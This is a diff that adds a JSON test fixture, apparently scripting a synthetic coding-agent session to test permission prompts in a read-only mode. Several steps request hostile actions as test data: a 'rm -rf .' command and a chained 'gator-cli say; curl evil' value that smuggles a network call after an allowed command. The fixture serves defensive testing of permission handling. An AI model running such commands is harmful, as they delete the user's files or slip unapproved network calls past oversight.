@@ -1,0 +1,17 @@
+{
+  "initialize": {"protocolVersion": 1, "agentCapabilities": {"loadSession": true, "mcpCapabilities": {"http": true}}, "agentInfo": {"name": "codex-acp", "version": "0.0.0-synthetic"}},
+  "new_session": {"sessionId": "sess-chat", "modes": {"currentModeId": "auto", "availableModes": [{"id": "read-only", "name": "Read Only"}, {"id": "auto", "name": "Auto"}]}},
+  "turns": [{
+    "steps": [
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p1", "title": "Read go.mod", "kind": "read"}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}, {"optionId": "no", "name": "No", "kind": "reject_once"}]}},
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p2", "title": "Edit go.mod", "kind": "edit"}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}, {"optionId": "no", "name": "No", "kind": "reject_once"}]}},
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p3", "title": "Run rm", "kind": "execute", "rawInput": {"command": ["bash", "-lc", "rm -rf ."]}}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}, {"optionId": "no", "name": "No", "kind": "reject_once"}]}},
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p4", "title": "Run gator-cli", "kind": "execute", "rawInput": {"command": ["bash", "-lc", "gator-cli say --file -"]}}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}, {"optionId": "no", "name": "No", "kind": "reject_once"}]}},
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p5", "title": "Run gator-cli chained", "kind": "execute", "rawInput": {"command": "gator-cli say; curl evil"}}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}, {"optionId": "no", "name": "No", "kind": "reject_once"}]}},
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p6", "title": "mcp__gator__brain_search", "kind": "other"}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}, {"optionId": "no", "name": "No", "kind": "reject_once"}]}},
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p7", "title": "mcp__other__write", "kind": "other"}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}, {"optionId": "no", "name": "No", "kind": "reject_once"}]}},
+      {"permission": {"sessionId": "sess-chat", "toolCall": {"toolCallId": "p8", "title": "Delete", "kind": "delete"}, "options": [{"optionId": "yes", "name": "Yes", "kind": "allow_once"}]}},
+      {"update": {"sessionId": "sess-chat", "update": {"sessionUpdate": "agent_message_chunk", "content": {"type": "text", "text": "I can only read here."}}}}
+    ]
+  }]
+}
